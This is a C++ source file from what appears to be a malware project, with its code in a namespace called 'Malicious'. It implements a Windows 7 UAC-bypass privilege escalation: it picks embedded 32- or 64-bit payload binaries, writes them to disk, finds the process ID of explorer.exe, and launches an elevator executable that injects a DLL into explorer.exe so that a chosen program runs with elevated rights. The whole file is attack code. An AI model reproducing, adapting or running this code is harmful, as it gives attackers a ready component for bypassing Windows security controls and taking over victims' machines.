#include "Elevator.hpp"
#include "BinaryRessource.hpp"

#include <log/Log.hpp>

#include <system/System.hpp>
#include <system/Uac.hpp>
#include <system/Process.hpp>
using namespace System;

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

namespace Malicious
{
	DWORD elevate(std::string programPath)
	{
		switch(getSystemVersion())
	    {
		    case OS_WIN32_WINDOWS_VISTA:
			    if(isUacActivated())
			    {
					LOG << "Privilege escalation is not supported on Windows Vista";
			    }
			    break;
		    case OS_WIN32_WINDOWS_SEVEN:
			    if(isUacActivated())
			    {
					LOG << "Trying privilege escalation";
					bool is64 = is64BitWindows();
					const unsigned char * elevatorDllPayload = is64 ? ElevatorDll64 : ElevatorDll32;
					size_t elevatorDllPayloadSize = is64 ? sizeof(ElevatorDll64) : sizeof(ElevatorDll32);

					const unsigned char * elevatorPayload = is64 ? Elevator64 : Elevator32;
					size_t elevatorPayloadSize = is64 ? sizeof(Elevator64) : sizeof(Elevator32);
					
					BinaryRessource elevatorDll(elevatorDllPayload, elevatorDllPayloadSize, ELEVATOR_DLL_NAME, true);
					BinaryRessource elevator(elevatorPayload, elevatorPayloadSize, ELEVATOR_EXE_NAME, true);
					
					DWORD explorer_pid = System::Process::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injecting escalaion DLL in explorer.exe : " + Common::toString(explorer_pid);
					}
					else
					{
						throw Common::Exception("Process explorer.exe does not exist");
					}
    				
                    System::Process::This thisProcess;
					using std::string;

                    string currentPath = thisProcess.getProgramDir();
					
                    string elevatorArguments = string(ELEVATOR_PROCESS_NAME) + " " + Common::toString(explorer_pid) + " " + currentPath+"\\"+std::string(ELEVATOR_DLL_NAME) + " " + programPath;
					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;

					System::Process::Launcher elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
					LOG << "Waiting elevator to finish";
					DWORD exitCode = elevatorProcess.wait();					
					return exitCode;
			    }
				break;
			default:
				LOG << "Operating system not supported";
        }
		return EXIT_FAILURE;
	}

} // Malicious
